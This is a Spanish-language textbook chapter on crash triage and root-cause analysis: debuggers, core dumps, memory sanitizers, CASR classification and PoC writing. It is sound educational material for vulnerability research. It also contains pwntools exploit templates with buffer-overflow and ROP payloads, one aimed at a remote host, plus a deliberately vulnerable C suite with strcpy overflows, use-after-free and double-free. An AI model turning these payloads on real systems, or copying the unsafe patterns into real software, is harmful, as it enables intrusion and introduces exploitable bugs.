# Capítulo 5: Análisis de Crashes

Después de encontrar vulnerabilidades potenciales mediante fuzzing o patch diffing, el siguiente paso crítico es analizar crashes para determinar si son explotables. Este capítulo cubre triage de crashes, dominio de depuradores, sanitizers de memoria y técnicas avanzadas de análisis de causa raíz.

## 5.1. 4.1 Fundamentos del Análisis de Crashes

El análisis de crashes es el proceso de transformar un crash descubierto por un fuzzer en conocimiento accionable sobre una vulnerabilidad. Esto incluye determinar la causa raíz, evaluar explotabilidad, y desarrollar pruebas de concepto.

### 5.1.1. Árbol de Decisión para Análisis de Crashes

1.  **CRASH RECIBIDO:** ¿Es reproducible?
2.  **CÓDIGO FUENTE:** ¿Disponible?
3.  **SANITIZERS:** Recompilar con ASAN/UBSAN si hay fuente.
4.  **DEPURADOR:** Usar GDB/WinDbg si no hay fuente.
5.  **CLASIFICAR:** Usar CASR para clasificar la vulnerabilidad.
6.  **MINIMIZAR:** Reducir el input de crash.
7.  **PoC:** Desarrollar una prueba de concepto.

## 5.2. 4.2 Depuradores y Configuración

### 5.2.1. WinDbg Preview para Windows

WinDbg Preview es el depurador estándar para análisis de crashes en Windows, con capacidades avanzadas de Time Travel Debugging.

**Instalación:**
```powershell
# Instalar desde Microsoft Store o winget
winget install Microsoft.WinDbgPreview

# Crear directorio de símbolos
mkdir C:\Symbols

# Configurar symbol path
[Environment]::SetEnvironmentVariable(
    "NT_SYMBOL_PATH",
    "SRV*C:\Symbols*https://msdl.microsoft.com/download/symbols",
    "User"
)
```

**Comandos Esenciales de WinDbg:**

| Comando | Propósito | Ejemplo |
|---------|-----------|---------|
| !analyze -v | Análisis automático de crash | N/A |
| k / kp / kv | Stack trace | kv 20 |
| r | Mostrar registros | r rax, rbx |
| u / ub | Disassembly | u rip L10 |
| d / db / dq | Dump de memoria | dq rsp L8 |
| !heap | Análisis del heap | !heap -s |
| !address | Info de memoria | !address rsp |
| lm | Listar módulos | lm vm ntdll |
| .ecxr | Contexto de excepción | N/A |

**Time Travel Debugging (TTD):**
TTD permite grabar la ejecución completa de un proceso y reproducirla.

```powershell
# Grabar ejecución
tttracer.exe -out C:\Traces -launch target.exe crash_input.txt

# Comandos TTD
!tt 0           # Ir al inicio
!tt 100         # Ir al final
g-              # Ejecutar hacia atrás
p-              # Step back
```

### 5.2.2. GDB + Pwndbg para Linux

Pwndbg es una extensión de GDB diseñada para análisis de vulnerabilidades.

**Instalación:**
```bash
git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh
pip install pwntools ropper capstone keystone-engine
```

**Configuración de Core Dumps:**
```bash
ulimit -c unlimited
echo "core. %e. %p. %t" | sudo tee /proc/sys/kernel/core_pattern
```

**Comandos Esenciales de Pwndbg:**

| Comando | Propósito |
|---------|-----------|
| context | Mostrar contexto completo |
| checksec | Verificar protecciones |
| vmmap | Mapa de memoria |
| telescope | Dereferencia inteligente |
| cyclic | Generar/buscar patrones |
| search | Buscar en memoria |
| heap | Análisis del heap |
| rop | Buscar gadgets ROP |

**Uso Típico:**
```bash
cd ~/crash_analysis_lab
gdb -q ./vuln_no_protect
pwndbg> set args 1 $(python3 -c "print('A'*100)")
pwndbg> run
pwndbg> context
pwndbg> bt
pwndbg> telescope $rsp 20
```

### 5.2.3. Colección de Dumps

**Windows - ProcDump:**
```powershell
# Configurar WER
reg add "HKLM\SOFTWARE\Microsoft\Windows\Windows Error Reporting\LocalDumps" /v DumpFolder /t REG_EXPAND_SZ /d "C:\Dumps"
reg add "HKLM\SOFTWARE\Microsoft\Windows\Windows Error Reporting\LocalDumps" /v DumpType /t REG_DWORD /d 2

# Capturar dump
procdump -e -ma target.exe -o C:\Dumps
```

**Linux - Core Dumps:**
```bash
# Habilitar
ulimit -c unlimited

# Systemd-coredump
sudo apt install systemd-coredump
coredumpctl list
coredumpctl info MATCH
```

### 5.2.4. PageHeap y AppVerifier (Windows)

```powershell
# Habilitar PageHeap
gflags /p /enable target.exe /full

# Con AppVerifier
appverif.exe
# Agregar aplicación → Seleccionar checks (Heaps, Handles, Locks)
```

## 5.3. 4.3 Sanitizadores de Memoria

Los sanitizers son herramientas de instrumentación que detectan bugs de memoria en tiempo de ejecución.

### 5.3.1. AddressSanitizer (ASAN)

ASAN detecta errores de memoria como desbordamientos y uso después de liberación.

**Compilación:**
```bash
# GCC
gcc -g -O1 -fsanitize=address -fno-omit-frame-pointer source.c -o target_asan

# Clang
clang -g -O1 -fsanitize=address -fno-omit-frame-pointer source.c -o target_asan
```

**Errores Detectados:**
| Error | Descripción |
|-------|-------------|
| heap-buffer-overflow | Escritura fuera de bounds en heap |
| stack-buffer-overflow | Overflow de buffer en stack |
| use-after-free | Acceso después de free() |
| double-free | Doble liberación |

### 5.3.2. UndefinedBehaviorSanitizer (UBSAN)

```bash
clang -g -O1 -fsanitize=undefined source.c -o target_ubsan
```

### 5.3.3. MemorySanitizer (MSAN)

```bash
clang -g -O1 -fsanitize=memory source.c -o target_msan
```

### 5.3.4. ThreadSanitizer (TSAN)

```bash
clang -g -O1 -fsanitize=thread source.c -o target_tsan
```

## 5.4. 4.4 Clasificación y Triage Automatizado

### CASR - Crash Analysis and Severity Reporter

```bash
cargo install casr
casr crash_dump --output report.json
```

**Clasificación:**
- EXPLOITABLE: Control de RIP/EIP
- PROBABLY_EXPLOITABLE: Lectura fuera de límites
- NOT_EXPLOITABLE: Crash no explotable

### Minimización de Crashes

```bash
# Con AFL
afl-tmin -i crash_input -o minimized_input -- ./target
```

## 5.5. 4.5 Análisis de Alcanzabilidad

### DynamoRIO + drcov

```bash
drrun -t drcov -- ./target input.txt
```

### Intel Processor Trace

```bash
sudo apt install intel-pt-decoder
intel-pt-decoder --input trace.pt --output trace.txt
```

### Frida

```bash
pip install frida-tools
frida-trace -i "*malloc*" ./target
```

### rr - Record and Replay

```bash
sudo apt install rr
rr record ./target input.txt
rr replay
```

## 5.6. 4.6 Desarrollo de PoC

### pwntools - Framework de Explotación

```python
#!/usr/bin/env python3
from pwn import *

context.update(arch='amd64', os='linux', log_level='debug')

# Conexión
io = remote('target.host', 1337)
# io = process('./vuln_binary')

# Offset hasta RIP
offset = 72

# Construir payload
payload = flat([
    b'A' * offset,
    p64(target_address)
])
io.sendline(payload)
io.interactive()
```

### PoC - Stack Buffer Overflow

```python
#!/usr/bin/env python3
from pwn import *

context(arch='amd64', os='linux', log_level='info')

# Generar crash y encontrar offset
io = process('./vuln_no_protect')
io.sendline(cyclic(200))
io.wait()
offset = cyclic_find(io.corefile.pc)
log.info(f"Offset: {offset}")

# Payload final
payload = fit({offset: p64(win_function)})
io.sendline(payload)
```

## 5.7. 4.7 Proyecto Capstone

### Suite de Pruebas Vulnerable

```c
// vulnerable_suite.c
void stack_overflow(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // Sin verificación
}

void heap_overflow(char *input) {
    char *buf = malloc(32);
    strcpy(buf, input);  // Overflow
}

void use_after_free(void) {
    char *ptr = malloc(64);
    free(ptr);
    printf("%s\n", ptr);  // UAF
}

void double_free(void) {
    char *ptr = malloc(64);
    free(ptr);
    free(ptr);  // Double free
}
```

**Compilación:**
```bash
gcc -g -fno-stack-protector -no-pie vulnerable_suite.c -o vuln_no_protect
gcc -g -O1 -fsanitize=address vulnerable_suite.c -o vuln_asan
```

### Explotación con ROP

```python
from pwn import *

elf = ELF('./vuln_no_protect')
offset = 72

rop = ROP(elf)
rop.raw(rop.find_gadget(['pop rdi', 'ret']).address)
rop.raw(p64(elf.symbols['win']))

payload = fit({offset: rop.chain()})
io = process(elf.path)
io.sendline(payload)
```

## 5.8. Conclusiones del Capítulo 5

1. **Sanitizers son esenciales** - Convierten bugs silenciosos en crashes informativos.
2. **Automatización acelera triage** - CASR clasifica crashes masivamente.
3. **Análisis de causa raíz requiere múltiples técnicas** - Depuradores, tracing, coverage.
4. **PoCs reproducibles son críticos** - Documentan la vulnerabilidad.
5. **Práctica con binarios vulnerables desarrolla habilidades**.

### Preguntas de Discusión:

1. ¿Cómo afectan las protecciones del compilador a la estrategia de explotación?
2. ¿Cuándo es preferible usar ASAN vs PageHeap vs análisis binario puro?
3. ¿Cómo se evalúa la explotabilidad de un crash sin control directo de RIP?
